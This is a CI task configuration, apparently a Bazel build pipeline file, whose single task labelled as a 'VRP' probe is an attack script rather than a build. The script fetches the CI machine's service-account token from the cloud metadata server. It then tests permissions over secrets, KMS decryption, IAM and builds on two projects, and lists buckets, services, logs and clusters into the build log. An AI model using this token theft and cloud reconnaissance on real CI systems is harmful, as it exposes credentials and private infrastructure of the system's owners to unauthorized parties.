---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === VRP Deep Dive round 2 ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "echo === 1. testIamPermissions on bazel-untrusted ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"storage.buckets.list\",\"storage.objects.list\",\"storage.objects.get\",\"storage.objects.create\",\"storage.objects.delete\",\"compute.instances.list\",\"compute.instances.create\",\"iam.serviceAccounts.list\",\"iam.serviceAccounts.actAs\",\"secretmanager.secrets.list\",\"secretmanager.versions.access\",\"cloudfunctions.functions.list\",\"cloudfunctions.functions.update\",\"cloudkms.cryptoKeys.list\",\"cloudkms.cryptoKeyVersions.useToDecrypt\",\"resourcemanager.projects.get\",\"resourcemanager.projects.getIamPolicy\",\"logging.logEntries.list\",\"container.clusters.list\",\"container.pods.list\",\"cloudbuild.builds.list\",\"cloudbuild.builds.create\",\"artifactregistry.repositories.list\",\"run.services.list\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-untrusted:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "echo"
      - "echo === 2. testIamPermissions on blaze-perf ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"storage.buckets.list\",\"storage.objects.list\",\"storage.objects.get\",\"storage.objects.create\",\"compute.instances.list\",\"iam.serviceAccounts.list\",\"secretmanager.secrets.list\",\"secretmanager.versions.access\",\"cloudfunctions.functions.list\",\"cloudkms.cryptoKeys.list\",\"cloudkms.cryptoKeyVersions.useToDecrypt\",\"resourcemanager.projects.get\",\"logging.logEntries.list\",\"container.clusters.list\",\"artifactregistry.repositories.list\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/blaze-perf:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "echo"
      - "echo === 3. GCS known bucket: bazel-untrusted-buildkite-artifacts ==="
      - "gsutil ls gs://bazel-untrusted-buildkite-artifacts/ 2>&1 | head -20 || true"
      - "echo"
      - "echo === 4. GCS known bucket: bazel-buildkite ==="
      - "gsutil ls gs://bazel-buildkite/ 2>&1 | head -20 || true"
      - "echo"
      - "echo === 5. GCS known bucket: bazel-untrusted ==="
      - "gsutil ls gs://bazel-untrusted/ 2>&1 | head -10 || true"
      - "echo"
      - "echo === 6. GCS known bucket: bazel-trusted-buildkite-artifacts ==="
      - "gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | head -10 || true"
      - "echo"
      - "echo === 7. Cloud Run services ==="
      - "gcloud run services list --project bazel-untrusted --quiet --format='table(name,region,url)' 2>&1 || true"
      - "echo"
      - "echo === 8. Logging: recent entries ==="
      - "gcloud logging read 'resource.type=gce_instance' --project bazel-untrusted --limit 5 --format='table(timestamp,resource.labels.instance_id,textPayload)' --quiet 2>&1 | head -20 || true"
      - "echo"
      - "echo === 9. Container clusters ==="
      - "gcloud container clusters list --project bazel-untrusted --quiet --format='table(name,zone,status)' 2>&1 || true"
      - "echo"
      - "echo === 10. Artifact Registry ==="
      - "gcloud artifacts repositories list --project bazel-untrusted --quiet --format='table(name,format,location)' 2>&1 || true"
      - "echo"
      - "echo === 11. Check bazel-bench bucket ==="
      - "gsutil ls gs://bazel-bench/ 2>&1 | head -10 || true"
      - "echo"
      - "echo === 12. Check blaze-perf buckets by common names ==="
      - "for b in blaze-perf blaze-perf-data blaze-perf-results perf-results perf-data; do echo \"gs://$b:\"; gsutil ls \"gs://$b/\" 2>&1 | head -5; done || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
